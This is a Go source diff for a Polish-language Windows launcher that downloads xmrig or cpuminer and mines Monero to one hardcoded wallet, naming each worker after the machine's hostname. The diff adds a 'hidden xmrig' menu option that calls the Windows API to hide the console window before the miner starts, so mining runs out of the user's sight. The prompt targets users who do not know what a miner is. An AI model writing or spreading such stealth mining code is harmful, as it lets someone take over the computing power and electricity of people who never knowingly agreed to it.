@@ -10,6 +10,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"syscall"
 
 	"github.com/schollz/progressbar/v3"
 )
@@ -94,23 +95,30 @@ W razie problemow napisz na aleksander.wajcht2021p@zsepoznan.pl
 Wybierz kopareczke: (jak nie wiesz co to wybierz 1)
  1. xmrig
  2. cpuminer
+ 3. ukryty xmrig
 >>> `)
 		reader := bufio.NewReader(os.Stdin)
 		input, _ := reader.ReadByte()
 		miner = string(input)
 	}
 
-	if miner == "1" {
+	if miner == "1" || miner == "3" {
 		pobieransko("https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip", "xmrig.zip")
 
 		rozpakowywansko("xmrig.zip")
+
+		if miner == "3" {
+			getConsoleWindow := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
+			showWindow := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
+			hwnd, _, _ := getConsoleWindow.Call()
+			showWindow.Call(hwnd, 0)
+		}
 
 		odpalansko(".\\xmrig\\xmrig.exe",
 			"-p", "x",
 			"-o", "xmr.2miners.com:2222",
 			"-u", "43bEsE2i48KAez5aQ3FUq54dfGfQ3HSdZitYxRFfdS93dY586VueJfHdH59o5gUSzgfyWCnkonZhyWh8P4GuU6RX2dXYB5k."+hostname,
 		)
-
 	} else if miner == "2" {
 		pobieransko("https://github.com/JayDDee/cpuminer-opt/releases/download/v3.20.3/cpuminer-opt-3.20.3-windows.zip", "cpuminer.zip")
 
